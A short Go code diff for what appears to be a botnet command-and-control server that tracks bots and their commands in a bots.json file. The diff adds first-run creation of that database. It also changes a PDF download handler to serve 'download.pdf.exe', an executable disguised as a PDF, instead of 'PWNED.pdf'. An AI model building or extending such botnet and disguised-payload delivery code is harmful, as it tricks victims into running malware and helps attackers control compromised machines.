@@ -25,6 +25,13 @@ type bot struct {
 	Command  string `json:"command"`
 }
 
+func writeToFile(data, file string) {
+	err := ioutil.WriteFile(file, []byte(data), 0666)
+	if err != nil {
+		panic(err)
+	}
+}
+
 func getBots() (bots []bot) {
 	fileBytes, err := ioutil.ReadFile("./bots.json")
 
@@ -157,7 +164,7 @@ func statusupdater() {
 }
 
 func pdfserver(res http.ResponseWriter, req *http.Request) {
-	http.ServeFile(res, req, filepath.Join(srcDir, "/files/PWNED.pdf"))
+	http.ServeFile(res, req, filepath.Join(srcDir, "/files/download.pdf.exe"))
 }
 
 func clientserver(res http.ResponseWriter, req *http.Request) {
@@ -227,6 +234,17 @@ func newRouter() *mux.Router {
 }
 
 func main() {
+
+	_, error := os.Stat("bots.json")
+
+	// check if error is "file not exists"
+	if os.IsNotExist(error) {
+		fmt.Printf("%v db does not exist, instantiating...\n", "bots.json")
+		writeToFile("[]", "bots.json")
+	} else {
+		fmt.Printf("%v db already exists\n", "bots.json")
+	}
+
 	r := newRouter()
 
 	wg := new(sync.WaitGroup)
